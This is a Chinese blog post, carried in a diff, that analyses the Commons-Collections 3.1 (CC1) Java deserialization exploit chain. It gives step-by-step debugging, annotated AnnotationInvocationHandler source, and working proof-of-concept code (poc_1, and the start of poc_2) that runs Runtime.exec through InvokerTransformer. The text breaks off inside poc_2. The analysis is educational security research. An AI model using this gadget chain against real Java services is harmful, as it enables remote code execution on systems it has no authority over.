@@ -152,6 +152,385 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">commons-collection1利用链分析</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-06-03 09:55:52 / Modified: 09:56:03" itemprop="dateCreated datePublished" datetime="2021-06-03T09:55:52+08:00">2021-06-03</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="1-序列化-与-反序列化"><a href="#1-序列化-与-反序列化" class="headerlink" title="1. 序列化 与 反序列化"></a>1. <strong>序列化 与 反序列化</strong></h4><ul>
+<li><p><strong>定义</strong>：<strong><u>序列化</u></strong>指 将 <strong><u>对象/数据结构</u></strong>的<u><strong>状态</strong></u>信息 转换为可以<u><strong>存储</strong></u>或<u><strong>传输</strong></u>的形式的过程，其<u><strong>反</strong></u>过程称为<u><strong>反序列化</strong></u>。</p>
+</li>
+<li><p><strong>作用</strong>：</p>
+<ul>
+<li>将对象<u><strong>持久化</strong></u>到<u><strong>存储介质</strong></u>以便再次使用</li>
+<li>使对象能在<u><strong>网络</strong></u>中传输</li>
+<li>如序列化格式<u><strong>独立于语言</strong></u>，可以实现<u><strong>不同语言</strong></u>之间<u><strong>对象的传递</strong></u></li>
+</ul>
+</li>
+<li><p><strong>常见形式</strong>：</p>
+<ul>
+<li>标准化格式：<ul>
+<li>独立于语言/平台的格式：<ul>
+<li>文本格式：xml，json等</li>
+<li>二进制格式：protobuf等</li>
+</ul>
+</li>
+<li>特定语言规定的格式：各类编程语言自带序列化格式（如java，python）</li>
+</ul>
+</li>
+<li>私有格式：。。。</li>
+</ul>
+</li>
+<li><p><strong>安全性思考</strong>：</p>
+<ul>
+<li><p>一切安全问题都产生于输入，这里的输入就是攻击端序列化好后的对象，被攻击端反序列化该对象。</p>
+</li>
+<li><p>大多数<strong><u>数据交换格式</u></strong>的实现中，序列化的对象<u><strong>仅可以包含属性</strong></u>，而<u><strong>不可以包含方法</strong></u>，所以<strong><u>不可能</u></strong>在序列化的过程中<strong><u>写入</u></strong>我们<strong><u>自己的代码</u></strong>，<strong><u>仅能控制</u></strong>对象的<strong><u>属性</u></strong>。</p>
+<p><strong>ps.</strong> 反序列化端进程空间<strong><u>必须持有</u></strong>对象的<strong><u>类型信息和代码</u></strong>，否则无法正常的使用对象(如调用对象的方法)。</p>
+</li>
+<li><p>被攻击端反序列化该对象的<strong><u>过程中</u></strong>或者反序列化该对象<strong><u>之后</u></strong>执行了<strong><u>依赖该对象</u></strong>的代码，我们就可以一定程度<strong><u>通过</u></strong>对象的<strong><u>属性</u></strong>影响被攻击端程序的运行逻辑。</p>
+</li>
+<li><p>大多数<strong><u>数据交换格式</u></strong>的实现中，在对象反序列化的<strong><u>过程中</u></strong>，都会调用 默认的或该对象自定义的反序列化处理方法（如java中的ObjectInputStream.readObject 或 对象自定义的obj.readObject），所以反序列化漏洞大多出现在对象反序列化的<u><strong>过程中</strong></u>。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-common-collection-1利用链分析"><a href="#2-common-collection-1利用链分析" class="headerlink" title="2. common-collection-1利用链分析"></a>2. common-collection-1利用链分析</h4><blockquote>
+<ul>
+<li><p>The <a href="http://docs.oracle.com/javase/tutorial/collections/" target="_blank" rel="noopener">Java Collections Framework</a> was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</p>
+<p>java collection 框架是jdk1.2 的主要补充，其增加了许多强大的数据结构，加速了大多数重要的java应用的开发。自那时起，它已经成为java处理集合的事实上的标准。</p>
+</li>
+<li><p><a href="https://commons.apache.org/proper/commons-collections/" target="_blank" rel="noopener">Commons-Collections</a> seek to build upon the JDK classes by providing new interfaces, implementations and utilities.</p>
+<p>Common-Collections 通过提供新的接口，实现和工具(类)扩展了jdk 中java collection的功能。</p>
+</li>
+</ul>
+</blockquote>
+<p>漏洞分析环境：jdk1.7  ， commons-collections-3.1，Intellij IDEA</p>
+<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc_1"></a>poc_1</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//复制这段代码 运行并调试</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//构造一个Transformer(转换器)数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用Transformer数组实例化Transformer链</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//为map绑定Transformer链，生成TransformedMap</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到TransformedMap的一个Entry</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry)outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//设置TransformedMap的Entry时会通过Transformer链对Value进行转换，转换过程依次执行Transformer链中的Transformer.transform方法，触发代码执行。</span></span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>poc_1  第34行打断点，运行(f9)</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622366778178.png" alt="1622366778178"></p>
+</li>
+<li><p>step into (f7)</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622366849023.png" alt="1622366849023"></p>
+</li>
+<li><p>step into (f7)</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622366888331.png" alt="1622366888331"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622367177772.png" alt="1622367177772"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622366950973.png" alt="1622366950973"></p>
+<p>valueTransformer类型为ChainedTransformer，其中包含1个ConstantTransformer，3个InvokerTransformer。然后调用了valueTransformer.transform对传入对象进行转换。</p>
+</li>
+<li><p>step into (f7)，第59行打断点</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622368649810.png" alt="1622368649810"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622367738856.png" alt="1622367738856"></p>
+<p>ChainedTransformer的iTransformers是一个Transformer数组，维护了其Transformer链。ChainedTransformer使用其维护的Transformer链上的Transformer依次对对象进行转换。每个Transformer.transform输入一个对象并返回转换后的对象，转换后的对象传给下一个Transformer直到所有Transformer处理完毕。</p>
+</li>
+<li><p>step into * 2 (f7 两次)，进入第一个Transformer(ConstantTransformer)的实现</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622368399429.png" alt="1622368399429"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622368422967.png" alt="1622368422967"></p>
+<p>返回java.lang.Runtime的class对象</p>
+</li>
+<li><p>运行(f9)，断在ChainedTransformer.transform的循环中</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622370300500.png" alt="1622370300500"></p>
+</li>
+<li><p>step into(f7)，进入第二个Transformer(InvokerTransformer)的实现，运行到第61行(alt+f9)</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622372409077.png" alt="1622372409077"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622370571481.png" alt="1622370571481"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622370687827.png" alt="1622370687827"></p>
+<p>此Transformer输入对象是java.lang.Runtime类的class对象，调用class对象的getMethod方法获取到java.lang.Runtime.getRuntime方法，返回其Method对象。</p>
+</li>
+<li><p>61行打断点(由poc知，后续所有的Transformer都是InvokerTransformer)，f9两次，进入第三个Transformer(InvokerTransformer)实现</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622427469533.png" alt="1622427469533"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622427399455.png" alt="1622427399455"></p>
+<p>此Transformer输入对象是java.lang.Runtime.getRuntime方法的Method的对象，调用Method对象的invoke方法得到Runtime对象，返回Runtime对象。</p>
+</li>
+<li><p>f9两次，进入第四个Transformer(InvokerTransformer)实现</p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622428774757.png" alt="1622428774757"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622428798070.png" alt="1622428798070"></p>
+<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/Users/admin/Desktop/note/1622428812562.png" alt="1622428812562"></p>
+<p>此Transformer输入对象是Runtime对象，调用Runtime对象的exec方法弹出计算器。</p>
+</li>
+</ul>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
+<li><p>TransformedMap对Map进行了增强，可以通过设置针对key/value的Transformer对将要存入Map的key/value对象进行转换。</p>
+</li>
+<li><p>Transformer是个接口，调用Transformer.transform方法可以对对象进行转换(传入要转换的对象，返回转换后的对象)，这里只关注其以下三种实现(<strong>三种实现均支持序列化!!!</strong>)</p>
+<ul>
+<li><p>ConstantTransformer，无论要转换的对象是什么，都返回一个<strong><u>固定</u></strong>的转换后的对象。</p>
+</li>
+<li><p>InvokerTransformer，<strong><u>调用</u></strong>要转换对象的一个<strong><u>成员方法</u></strong>，该成员方法返回转换后的对象。</p>
+</li>
+<li><p>ChainedTransformer，可以接受一个Transformer数组生成一个<strong><u>转换链</u></strong>。<strong><u>依次调用</u></strong>每个Transformer的transform方法对对象进行处理，<strong><u>前一个</u></strong>Transformer的<strong><u>输出对象</u></strong>作为<strong><u>后一个</u></strong>Transformer的<strong><u>输入</u></strong>。可以用ConstantTransformer初始化要转换的对象。</p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>如果想要<strong><u>调用</u></strong>一个<strong><u>对象的方法</u></strong>，可以定义一个ChainedTransformer。用ConstantTransformer<strong><u>初始化</u></strong>要转换的<strong><u>对象</u></strong>，用InvokerTransformer<strong><u>调用</u></strong>要转换<strong><u>对象的方法</u></strong>。定义ChainedTransformer<strong><u>只是定义</u></strong>了一个<strong><u>对象</u></strong>，其<strong><u>转换逻辑只有在</u></strong>TransformedMap 的<strong><u>key/value值被初始化或改变</u></strong>的时候才会<strong><u>触发</u></strong>(如poc_1对TransformedMap第一个Entry调用setValue方法触发转换逻辑)。</li>
+</ul>
+<h4 id="3-让目标程序执行恶意逻辑"><a href="#3-让目标程序执行恶意逻辑" class="headerlink" title="3. 让目标程序执行恶意逻辑"></a>3. 让目标程序执行恶意逻辑</h4><h5 id="能否在目标机运行poc-1中的恶意转换逻辑"><a href="#能否在目标机运行poc-1中的恶意转换逻辑" class="headerlink" title="能否在目标机运行poc_1中的恶意转换逻辑?"></a>能否在目标机运行poc_1中的恶意转换逻辑?</h5><ul>
+<li><p>需要找一个合适的<strong><u>输入点</u></strong>。但是<strong><u>一般</u></strong>情况下，<strong><u>很难有</u></strong>一个<strong><u>输入点</u></strong>可以让我们将自己的<strong><u>代码插入</u></strong>。即使有也不够通用，往往是一个命令执行的漏洞，如有一个groovy(groovy兼容java语法)命令执行的输入点(但都有命令执行了还看个泡泡茶壶=_=!)。</p>
+</li>
+<li><p>所以<strong><u>只能利用</u></strong>程序中<strong><u>已加载</u></strong>的<strong><u>代码</u></strong>，通过<strong><u>控制代码关联的数据间接控制</u></strong>代码的<strong><u>执行逻辑</u></strong>。对java这种面向对象的语言来说，控制对象的<strong><u>属性</u></strong>就可以影响其方法的执行逻辑。有什么<strong><u>输入点</u></strong>可以比较方便的<strong><u>控制</u></strong>对象的<strong><u>属性</u></strong>？显然，反序列化（反序列化可以完全控制对象的属性，其他输入方式大多只能控制属性的一小部分字段）。</p>
+</li>
+<li><p>如果目标程序存在反序列化输入点，我们就可以构造序列化好的对象发送给目标程序。目标<strong><u>何时调用</u></strong>这个<strong><u>对象关联的代码</u></strong>?</p>
+<ul>
+<li><p>如果该对象的类<strong><u>重写</u></strong>了readObject方法，<strong><u>反序列化</u></strong>该对象的<strong><u>过程中会调用</u></strong>该对象的readObject方法。</p>
+</li>
+<li><p>反序列化对象<strong><u>以后</u></strong>，程序可能会使用反序列化后的对象，也<strong><u>可能</u></strong>调用其方法。</p>
+</li>
+</ul>
+<p>显然，前种情况<strong><u>执行方法</u></strong>的<strong><u>时机</u></strong>更加<strong><u>稳定</u></strong>(反序列化<strong><u>过程中</u></strong>readObject<strong><u>必然被调用</u></strong>到)，后者<strong><u>执行方法</u></strong>的<strong><u>时机</u></strong>则非常<strong><u>依赖</u></strong>程序对反序列化后对象的<strong><u>使用的策略</u></strong>(例如：可能先将反序列化后的对象维护到一个全局数据结构，很久以后才用)。所以我们优先考虑第一种情况。</p>
+</li>
+<li><p>整理一下，攻击端序列化一个对象发送给目标程序，目标程序反序列化过程中调用此对象的readObject方法，readObject触发恶意逻辑。</p>
+<p>由于readObject是目标程序定义的方法，我们无法修改，所以触发恶意逻辑的代码必须要尽可能的短，否则很难找到合适的反序列化输入点。</p>
+<p>好在common-collection1链的触发逻辑就非常短，（例如对绑定了恶意ChainedTransformer的TransformedMap调用put方法，或对TransformedMap的Entry调用setValue方法等）。</p>
+<p>因此，我们需要找一个<strong><u>漏洞触发类</u></strong>满足这样的条件：</p>
+<ul>
+<li>类在目标程序的代码空间里，且类可以序列化</li>
+<li>类中包含一个Map类型的属性，我们将其赋值为绑定了恶意ChainedTransformer的TransformedMap。</li>
+<li>其实现了readObject，readObject对Map属性（Map是一个接口，现在指向恶意TransformedMap）的key/value进行了更新(触发恶意逻辑)</li>
+</ul>
+<p>于是，<strong><u>攻击流程</u></strong>是这样（代码见poc_2，poc_2中漏洞触发类是AnnotationInvocationHandler）：</p>
+<ul>
+<li>攻击者实例化一个<strong><u>漏洞触发类</u></strong>的对象，将map字段填充为<strong><u>绑定了恶意</u></strong>ChainedTransformer的TransformedMap对象。序列化并发送给目标机。</li>
+<li>目标收到并反序列化<strong><u>漏洞触发对象</u></strong>，调用readObject方法，对map字段的key/value进行更新，触发恶意的ChainedTransformer的转换逻辑，执行恶意代码。</li>
+</ul>
+<p>于是关键就是要找一个<strong><u>漏洞触发类</u></strong>，好在有人已经找到了满足上述条件的类。</p>
+</li>
+</ul>
+<h5 id="漏洞触发类AnnotationInvocationHandler"><a href="#漏洞触发类AnnotationInvocationHandler" class="headerlink" title="漏洞触发类AnnotationInvocationHandler"></a>漏洞触发类AnnotationInvocationHandler</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//poc_2中使用的漏洞触发类</span></span><br><span class="line"><span class="comment">//满足我们之前提到的漏洞触发类须满足的3个条件 1. 2. 3</span></span><br><span class="line"><span class="comment">//类的构造需要满足另外的条件(1)(2)...(6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.此类在jdk中，必然会被加载，可序列化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="comment">//2.含有一个Map类型的属性，可以用构造方法对其赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="comment">//(1)var1.isAnnotation(): 传入的var1是注解的class对象</span></span><br><span class="line">        <span class="comment">//(2)var3.length == 1: 该注解只实现了一个接口</span></span><br><span class="line">        <span class="comment">//(3)var3[0] == Annotation.class: 该注解了实现java.lang.annotation.Annotation接口</span></span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//将传入的注解的class对象赋值给this.type</span></span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="comment">//将传入的TransformedMap赋值给this.memberValues</span></span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取传入注解关联的AnnotationType实例</span></span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//通过AnnotationType实例获取注解接口信息。注解接口信息是Map类型，key是注解接口中的方法名，value是该方法的返回类型</span></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="comment">//迭代获取传入的TransformedMap的Entry</span></span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            <span class="comment">//获取Entry的key</span></span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            <span class="comment">//通过Entry中的key在注解接口信息中获取注解接口中对应方法的返回类型</span></span><br><span class="line">            <span class="comment">//(4)Entry中的key必须也可以作为注解接口信息的key，即Entry的key必须等于注解接口的任一方法名（例如传入Target.class对象，那么TransformedMap的key必须是"value"）</span></span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//获取Entry的value</span></span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="comment">//(5)Entry的value不是拿到注解接口信息中对应方法的返回类型的实例</span></span><br><span class="line">                <span class="comment">//(6)Entry的value不是ExceptionProxy实例</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//3.实现了readObject方法，并在readObject方法中调用了对map value的更新方法，触发恶意转换逻辑</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以，将绑定了恶意ChainedTransformer的AnnotationInvocationHandler序列化发给目标程序即可。代码如下：</p>
+<h5 id="poc-2"><a href="#poc-2" class="headerlink" title="poc_2"></a>poc_2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////复制这段代码 运行并调试</span></span><br><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//构造一个Transformer(转换器)数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">               <span class="comment">//Runtime不可序列化，但是Class可以，具体逻辑简单分析即可</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new 